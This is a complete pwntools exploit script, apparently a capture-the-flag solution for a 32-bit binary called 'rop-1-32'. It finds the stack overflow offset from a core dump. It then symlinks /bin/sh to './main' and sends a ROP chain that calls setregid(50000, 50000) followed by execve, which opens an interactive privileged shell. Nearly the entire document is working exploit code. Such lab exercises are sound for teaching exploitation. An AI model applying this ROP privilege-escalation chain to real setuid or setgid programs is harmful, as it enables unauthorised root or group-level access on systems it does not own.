from pwn import *
import os

DEBUG = False 
file = "./rop-1-32"
env = {"PATH":"$PATH:."}

elf = ELF(file)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(1000).find(p32(core.eip))
os.unlink(core.path)


# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

os.symlink("/bin/sh", "./main")

setregid = elf.symbols["setregid"]
execve = elf.symbols["execve"]

main = p32(0x80482ba)
pop2 = p32(0x080486ca)

payload = flat (
    b"A" * max_len,
    setregid,    
    pop2,
    p32(50000),
    p32(50000),
    execve,
    b"A" * 4,
    main,
    p32(0),
    p32(0),
)

io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
os.unlink("./main")
